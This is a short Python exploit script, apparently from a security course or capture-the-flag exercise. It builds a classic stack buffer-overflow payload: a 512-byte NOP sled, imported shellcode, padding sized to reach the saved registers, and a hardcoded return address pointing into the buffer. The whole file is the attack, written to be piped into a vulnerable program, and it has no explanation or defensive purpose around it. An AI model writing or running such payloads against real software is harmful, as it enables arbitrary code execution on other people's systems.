import sys
from shellcode import shellcode

# address of buf + 256
shellcode_addr = b"\x52\xae\xf6\xbf"

sys.stdout.buffer.write(b"\x90" * 512)
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b"a" * (894 - len(shellcode) - 512))
sys.stdout.buffer.write(b"a" * 8)
sys.stdout.buffer.write(b"a" * 4)

sys.stdout.buffer.write(shellcode_addr)
